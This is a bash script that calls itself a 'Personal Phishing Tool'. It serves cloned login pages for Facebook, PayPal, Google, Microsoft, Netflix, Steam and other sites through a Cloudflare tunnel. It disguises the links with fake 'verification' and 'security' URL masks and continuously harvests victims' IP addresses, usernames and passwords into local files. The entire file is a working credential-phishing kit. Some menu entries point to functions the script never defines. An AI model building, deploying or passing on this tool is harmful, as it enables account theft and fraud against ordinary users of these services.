#!/bin/bash

# Personal Phishing Tool
# Author: [NoneR00tk1t]
# Credit: Original concept by htr-tech and other contributors

# Color Codes
RED="$(printf '\033[31m')"  
GREEN="$(printf '\033[32m')"  
YELLOW="$(printf '\033[33m')"  
BLUE="$(printf '\033[34m')"
PURPLE="$(printf '\033[35m')"  
CYAN="$(printf '\033[36m')"  
WHITE="$(printf '\033[37m')" 
BLACK="$(printf '\033[30m')"
REDBG="$(printf '\033[41m')"  
GREENBG="$(printf '\033[42m')"  
YELLOWBG="$(printf '\033[43m')"  
BLUEBG="$(printf '\033[44m')"
PURPLEBG="$(printf '\033[45m')"  
CYANBG="$(printf '\033[46m')"  
WHITEBG="$(printf '\033[47m')" 
BLACKBG="$(printf '\033[40m')"
RESETBG="$(printf '\e[0m\n')"

if [[ ! -d ".server" ]]; then
	mkdir -p ".server"
fi
if [[ -d ".server/www" ]]; then
	rm -rf ".server/www"
	mkdir -p ".server/www"
else
	mkdir -p ".server/www"
fi
if [[ -e ".cld.log" ]]; then
	rm -rf ".cld.log"
fi

exit_on_signal_SIGINT() {
    { printf "\n\n%s\n\n" "${RED}[${WHITE}!${RED}]${RED} Operation aborted by user." 2>&1; reset_color; }
    exit 0
}

exit_on_signal_SIGTERM() {
    { printf "\n\n%s\n\n" "${RED}[${WHITE}!${RED}]${RED} Tool terminated successfully." 2>&1; reset_color; }
    exit 0
}

trap exit_on_signal_SIGINT SIGINT
trap exit_on_signal_SIGTERM SIGTERM

reset_color() {
	tput sgr0
	tput op
    return
}

kill_pid() {
	if [[ `pidof php` ]]; then
		killall php > /dev/null 2>&1
	fi
	if [[ `pidof cloudflared` ]]; then
		killall cloudflared > /dev/null 2>&1
	fi
}

## Banner
banner() {
	cat <<- EOF
		${PURPLE}┌──────────────────────────────────────────────────────────┐
		${PURPLE}│${CYAN}          ____  _   _ _____ _   _ _______ ______          ${PURPLE}│
		${PURPLE}│${CYAN}         |  _ \| \ | |_   _| \ | |__   __|  ____|         ${PURPLE}│
		${PURPLE}│${CYAN}         | |_) |  \| | | | |  \| |  | |  | |__            ${PURPLE}│
		${PURPLE}│${CYAN}         |  _ <| . \` | | | | . \` |  | |  |  __|           ${PURPLE}│
		${PURPLE}│${CYAN}         | |_) | |\  |_| |_| |\  |  | |  | |____           ${PURPLE}│
		${PURPLE}│${CYAN}         |____/|_| \_|_____|_| \_|  |_|  |______|          ${PURPLE}│
		${PURPLE}│                                                          │
		${PURPLE}│${YELLOW}  [-]${WHITE} Author: ${CYAN}NoneR00tk1t                    ${PURPLE}│
		${PURPLE}│${YELLOW}  [-]${WHITE} Version: ${CYAN}2.0                           ${PURPLE}│
		${PURPLE}└──────────────────────────────────────────────────────────┘
		
	EOF
}

dependencies() {
	echo -e "\n${GREEN}[${WHITE}+${GREEN}]${CYAN} Checking required packages..."

    if [[ -d "/data/data/com.termux/files/home" ]]; then
        if [[ `command -v proot` ]]; then
            printf ''
        else
			echo -e "\n${GREEN}[${WHITE}+${GREEN}]${CYAN} Installing: ${YELLOW}proot${CYAN}"${WHITE}
            pkg install proot resolv-conf -y
        fi
    fi

	if [[ `command -v php` && `command -v wget` && `command -v curl` && `command -v unzip` ]]; then
		echo -e "\n${GREEN}[${WHITE}+${GREEN}]${GREEN} Dependencies already installed."
	else
		pkgs=(php curl wget unzip)
		for pkg in "${pkgs[@]}"; do
			type -p "$pkg" &>/dev/null || {
				echo -e "\n${GREEN}[${WHITE}+${GREEN}]${CYAN} Installing: ${YELLOW}$pkg${CYAN}"${WHITE}
				if [[ `command -v pkg` ]]; then
					pkg install "$pkg" -y
				elif [[ `command -v apt` ]]; then
					apt install "$pkg" -y
				elif [[ `command -v apt-get` ]]; then
					apt-get install "$pkg" -y
				elif [[ `command -v pacman` ]]; then
					sudo pacman -S "$pkg" --noconfirm
				elif [[ `command -v dnf` ]]; then
					sudo dnf -y install "$pkg"
				else
					echo -e "\n${RED}[${WHITE}!${RED}]${RED} Package manager not supported. Install manually."
					{ reset_color; exit 1; }
				fi
			}
		done
	fi
}

download_cloudflared() {
	url="$1"
	file=`basename $url`
	if [[ -e "$file" ]]; then
		rm -rf "$file"
	fi
	wget --no-check-certificate "$url" > /dev/null 2>&1
	if [[ -e "$file" ]]; then
		mv -f "$file" .server/cloudflared > /dev/null 2>&1
		chmod +x .server/cloudflared > /dev/null 2>&1
	else
		echo -e "\n${RED}[${WHITE}!${RED}]${RED} Cloudflared download failed. Install manually."
		{ reset_color; exit 1; }
	fi
}

install_cloudflared() {
	if [[ -e ".server/cloudflared" ]]; then
		echo -e "\n${GREEN}[${WHITE}+${GREEN}]${GREEN} Cloudflared already installed."
	else
		echo -e "\n${GREEN}[${WHITE}+${GREEN}]${CYAN} Installing Cloudflared..."${WHITE}
		arch=`uname -m`
		if [[ ("$arch" == *'arm'*) || ("$arch" == *'Android'*) ]]; then
			download_cloudflared 'https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-arm'
		elif [[ "$arch" == *'aarch64'* ]]; then
			download_cloudflared 'https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-arm64'
		elif [[ "$arch" == *'x86_64'* ]]; then
			download_cloudflared 'https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64'
		else
			download_cloudflared 'https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-386'
		fi
	fi
}

msg_exit() {
	{ clear; banner; echo; }
	echo -e "${GREENBG}${BLACK} Security testing complete. ${RESETBG}\n"
	{ reset_color; exit 0; }
}

about() {
	{ clear; banner; echo; }
	cat <<- EOF
		${GREEN}Developer ${RED}:  ${YELLOW}NoneR00tk1t
		${GREEN}Contact   ${RED}:  ${CYAN}killuakiya@email.com
		${GREEN}Version   ${RED}:  ${YELLOW}2.0



		${RED}[${WHITE}00${RED}]${YELLOW} Main Menu     ${RED}[${WHITE}99${RED}]${YELLOW} Exit

	EOF

	read -p "${RED}[${WHITE}-${RED}]${GREEN} Select option: ${BLUE}"

	case $REPLY in 
		99)
			msg_exit;;
		0 | 00)
			echo -ne "\n${GREEN}[${WHITE}+${GREEN}]${CYAN} Returning to main menu..."
			{ sleep 1; main_menu; };;
		*)
			echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid option, try again..."
			{ sleep 1; about; };;
	esac
}

HOST='127.0.0.1'
PORT='8080'

setup_site() {
	echo -e "\n${RED}[${WHITE}-${RED}]${BLUE} Configuring server..."${WHITE}
	cp -rf .sites/"$website"/* .server/www
	cp -f .sites/ip.php .server/www/
	echo -ne "\n${RED}[${WHITE}-${RED}]${BLUE} Starting PHP server..."${WHITE}
	cd .server/www && php -S "$HOST":"$PORT" > /dev/null 2>&1 & 
}

capture_ip() {
	IP=$(grep -a 'IP:' .server/www/ip.txt | cut -d " " -f2 | tr -d '\r')
	IFS=$'\n'
	echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Target IP: ${BLUE}$IP"
	echo -ne "\n${RED}[${WHITE}-${RED}]${BLUE} Saved to: ${YELLOW}ip.txt"
	cat .server/www/ip.txt >> ip.txt
}

capture_creds() {
	ACCOUNT=$(grep -o 'Username:.*' .server/www/usernames.txt | cut -d " " -f2)
	PASSWORD=$(grep -o 'Pass:.*' .server/www/usernames.txt | cut -d ":" -f2)
	IFS=$'\n'
	echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Username: ${BLUE}$ACCOUNT"
	echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Password: ${BLUE}$PASSWORD"
	echo -e "\n${RED}[${WHITE}-${RED}]${BLUE} Saved to: ${YELLOW}credentials.dat"
	cat .server/www/usernames.txt >> credentials.dat
	echo -ne "\n${RED}[${WHITE}-${RED}]${YELLOW} Waiting for next entry, ${BLUE}Ctrl+C ${YELLOW}to exit."
}

capture_data() {
	echo -ne "\n${RED}[${WHITE}-${RED}]${YELLOW} Monitoring for data, ${BLUE}Ctrl+C ${YELLOW}to exit..."
	while true; do
		if [[ -e ".server/www/ip.txt" ]]; then
			echo -e "\n\n${RED}[${WHITE}-${RED}]${GREEN} IP captured!"
			capture_ip
			rm -rf .server/www/ip.txt
		fi
		sleep 0.75
		if [[ -e ".server/www/usernames.txt" ]]; then
			echo -e "\n\n${RED}[${WHITE}-${RED}]${GREEN} Credentials captured!"
			capture_creds
			rm -rf .server/www/usernames.txt
		fi
		sleep 0.75
	done
}

start_cloudflared() { 
        rm .cld.log > /dev/null 2>&1 &
	echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Initializing... ${GREEN}( ${CYAN}https://$HOST:$PORT ${GREEN})"
	{ sleep 1; setup_site; }
	echo -ne "\n\n${RED}[${WHITE}-${RED}]${GREEN} Launching tunnel..."

    if [[ `command -v termux-chroot` ]]; then
		sleep 2 && termux-chroot ./.server/cloudflared tunnel -url "$HOST":"$PORT" --logfile .cld.log > /dev/null 2>&1 &
    else
        sleep 2 && ./.server/cloudflared tunnel -url "$HOST":"$PORT" --logfile .cld.log > /dev/null 2>&1 &
    fi

	{ sleep 8; clear; banner; }
	
	cldflr_link=$(grep -o 'https://[-0-9a-z]*\.trycloudflare.com' ".cld.log")
	cldflr_link1=${cldflr_link#https://}
	echo -e "\n${RED}[${WHITE}-${RED}]${BLUE} URL 1: ${GREEN}$cldflr_link"
	echo -e "\n${RED}[${WHITE}-${RED}]${BLUE} URL 2: ${GREEN}$mask@$cldflr_link1"
	echo -e "\n${YELLOW} If tunnel fails, wait 1 minute for stabilization."
	capture_data
}

tunnel_menu() {
	{ clear; banner; }
	cat <<- EOF
		${GREEN}[${WHITE}1${GREEN}]${CYAN} Localhost
		${GREEN}[${WHITE}2${GREEN}]${CYAN} Cloudflared (Recommended)
		${GREEN}[${WHITE}3${GREEN}]${CYAN} Custom URL

	EOF

	read -p "${RED}[${WHITE}-${RED}]${GREEN} Select method: ${BLUE}"

	case $REPLY in 
		1)
			echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Starting on: ${BLUE}http://$HOST:$PORT"
			setup_site
			capture_data;;
		2)
			start_cloudflared;;
		3)
			read -p "${RED}[${WHITE}-${RED}]${GREEN} Enter URL: ${BLUE}" custom_url
			echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Starting on: ${BLUE}$custom_url"
			setup_site
			capture_data;;
		*)
			echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid option, try again..."
			{ sleep 1; tunnel_menu; };;
	esac
}

site_facebook() {
	cat <<- EOF
		${RED}[${WHITE}01${RED}]${YELLOW} Standard Login
		${RED}[${WHITE}02${RED}]${YELLOW} Poll Login
		${RED}[${WHITE}03${RED}]${YELLOW} Security Alert
		${RED}[${WHITE}04${RED}]${YELLOW} Messenger Login

	EOF

	read -p "${RED}[${WHITE}-${RED}]${GREEN} Select option: ${BLUE}"

	case $REPLY in 
		1 | 01)
			website="facebook"
			mask='https://facebook-verified-badge'
			tunnel_menu;;
		2 | 02)
			website="fb_advanced"
			mask='https://facebook-poll-security'
			tunnel_menu;;
		3 | 03)
			website="fb_security"
			mask='https://facebook-security-alert'
			tunnel_menu;;
		4 | 04)
			website="fb_messenger"
			mask='https://messenger-premium-features'
			tunnel_menu;;
		*)
			echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid option, try again..."
			{ sleep 1; clear; site_facebook; };;
	esac
}

main_menu() {
	{ clear; banner; echo; }
	cat <<- EOF
		${RED}[${WHITE}::${RED}]${YELLOW} Select Target Website ${RED}[${WHITE}::${RED}]${YELLOW}

		${RED}[${WHITE}01${RED}]${YELLOW} Facebook       ${RED}[${WHITE}11${RED}]${YELLOW} Twitch
		${RED}[${WHITE}02${RED}]${YELLOW} Instagram      ${RED}[${WHITE}12${RED}]${YELLOW} Pinterest
		${RED}[${WHITE}03${RED}]${YELLOW} Google         ${RED}[${WHITE}13${RED}]${YELLOW} Snapchat
		${RED}[${WHITE}04${RED}]${YELLOW} Microsoft      ${RED}[${WHITE}14${RED}]${YELLOW} LinkedIn
		${RED}[${WHITE}05${RED}]${YELLOW} Netflix        ${RED}[${WHITE}15${RED}]${YELLOW} eBay
		${RED}[${WHITE}06${RED}]${YELLOW} PayPal         ${RED}[${WHITE}16${RED}]${YELLOW} Quora
		${RED}[${WHITE}07${RED}]${YELLOW} Steam          ${RED}[${WHITE}17${RED}]${YELLOW} ProtonMail
		${RED}[${WHITE}08${RED}]${YELLOW} Twitter        ${RED}[${WHITE}18${RED}]${YELLOW} Spotify
		${RED}[${WHITE}09${RED}]${YELLOW} PlayStation    ${RED}[${WHITE}19${RED}]${YELLOW} Reddit
		${RED}[${WHITE}10${RED}]${YELLOW} TikTok         ${RED}[${WHITE}20${RED}]${YELLOW} Adobe

		${RED}[${WHITE}99${RED}]${YELLOW} About          ${RED}[${WHITE}00${RED}]${YELLOW} Exit

	EOF
	
	read -p "${RED}[${WHITE}-${RED}]${GREEN} Select option: ${BLUE}"

	case $REPLY in 
		1 | 01)
			site_facebook;;
		2 | 02)
			site_instagram;;
		3 | 03)
			site_gmail;;
		4 | 04)
			website="microsoft"
			mask='https://microsoft-account-security'
			tunnel_menu;;
		5 | 05)
			website="netflix"
			mask='https://netflix-premium-upgrade'
			tunnel_menu;;
		6 | 06)
			website="paypal"
			mask='https://paypal-account-verification'
			tunnel_menu;;
		7 | 07)
			website="steam"
			mask='https://steam-gift-card'
			tunnel_menu;;
		8 | 08)
			website="twitter"
			mask='https://twitter-blue-badge'
			tunnel_menu;;
		9 | 09)
			website="playstation"
			mask='https://playstation-plus-code'
			tunnel_menu;;
		10)
			website="tiktok"
			mask='https://tiktok-verification-badge'
			tunnel_menu;;
		99)
			about;;
		0 | 00)
			msg_exit;;
		*)
			echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid option, try again..."
			{ sleep 1; main_menu; };;
	esac
}

kill_pid
dependencies
install_cloudflared
main_menu